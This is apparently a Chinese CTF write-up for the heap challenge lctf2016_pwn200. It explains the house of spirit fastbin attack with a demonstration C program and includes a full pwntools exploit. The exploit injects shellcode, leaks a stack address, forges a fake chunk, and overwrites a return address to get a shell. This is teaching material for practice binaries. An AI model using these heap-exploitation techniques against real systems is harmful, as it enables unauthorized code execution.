    weeryee 5/30/2023 pwnctfheap

    题目：lctf2016_pwn200 (opens new window)

    # 题目分析

    先 checksec 一下：

    可以看到，几乎没开保护，再进 IDA 看一下： 经过分析，漏洞在以下位置：

    由于这道题并没有开 NX 保护，于是我们可以通过写入 shellcode 并执行（不需要泄露 libc 之类的）。

    # 原理

    可以改 free_got，但由于在学习 fastbin_attack 的 house of spirit，于是用 HOS 的方法来做。

    HOS 的利用：

    #include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr, "This file demonstrates the house of spirit attack.\n");

    fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
    malloc(1);

    fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
    unsigned long long *a;
    // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

    fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[7]);

    fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
    fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
    fake_chunks[1] = 0x40; // this is the size

    fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
    fake_chunks[9] = 0x1234; // nextsize

    fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
    fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
    a = &fake_chunks[2];

    fprintf(stderr, "Freeing the overwritten pointer.\n");
    free(a);

    fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
    fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}

    大致过程为：构造一个虚假的 fastbin chunk，然后将其 free，再次 malloc，由于 free 将构造的 chunk 加入了 fastbin 的链表，因此再次申请相同大小的 chunk 就会分配到该 chunk，于是我们实现了控制申请内容到指定地址的目的。

    该攻击的难点在于如何构造 chunk 绕过检测。

    # 利用思路

    # 思路一

    思路一（非 HOS）：写入 shellcode，泄露 rbp 地址从而计算出 shellcode 地址（漏洞一），将 dest 改为 free@got ，buf 的内容改为 shellcode 地址（漏洞二），通过 strcpy 将 free@got 改为 shellcode_addr ，调用 free，就可以 get_shell

    # 思路二

    通过 house of spirit 将返回地址改为 shellcode。

    # 利用过程

    # Step1

    输入 shellcode，并泄露 rbp_addr，通过泄露的地址计算 shellcode_addr

    # Step2

    构造 fake_chunk 并写入。

    # Step3

    Free 这个 fake_chunk。

    # Step4

    malloc 一个 0x30 大小的 chunk，则其一定会在我们指定的位置，我们可以在该位置上读入数据，而这个读入的长度可以覆盖返回地址，我们将其改为 shellcode 地址即可。

    # exp

    from pwn import *
context(log_level='debug',arch='amd64',os='linux')
pwnflie = './pwn200'

def DBG(io):
    if args['R']:
        return
    else:
        gdb.attach(io)
        pause()

io = process(['/root/glibc-all-in-one/libs/2.23-0ubuntu10_amd64/ld-2.23.so',pwnflie],env={'LD_PRELOAD':'/root/glibc-all-in-one/libs/2.23-0ubuntu10_amd64/libc.so.6'})
libc = ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu10_amd64/libc.so.6')


if args['R']:
    io = remote('node4.buuoj.cn',27890)

def who_are_u(pld):
    io.sendafter("u?\n",pld)
    io.recvuntil(pld)
    rbp_addr = u64(io.recv(6).ljust(8,b'\x00'))
    return rbp_addr

def give_id():
    io.sendlineafter("id ~~?\n","32")

def give_money(content):
    io.recvuntil('money~')
    io.send(content)

def check_in(content):
    io.sendlineafter("choice : ","1")
    io.sendlineafter("long?\n",'48')
    io.recvline('48')
    io.sendline(content)
    
def check_out():
    io.sendlineafter("choice : ","2")
    

shellcode =  asm(shellcraft.amd64.linux.sh())
pld = shellcode.ljust(48)
rbp_addr = who_are_u(pld)
shellcode_addr = rbp_addr - 0x50
fake_addr = rbp_addr - 0x90
print("rbp_addr:",hex(rbp_addr))

give_id()
pld = p64(0)*5 + p64(0x41)
pld = pld.ljust(56,b'\x00') + p64(fake_addr)
give_money(pld)

check_out()
pld = b'a'*0x18 + p64(shellcode_addr)
pld = pld.ljust(48,b'\x00')

check_in(pld)
DBG(io)

io.sendlineafter("choice : ","3")
io.interactive()
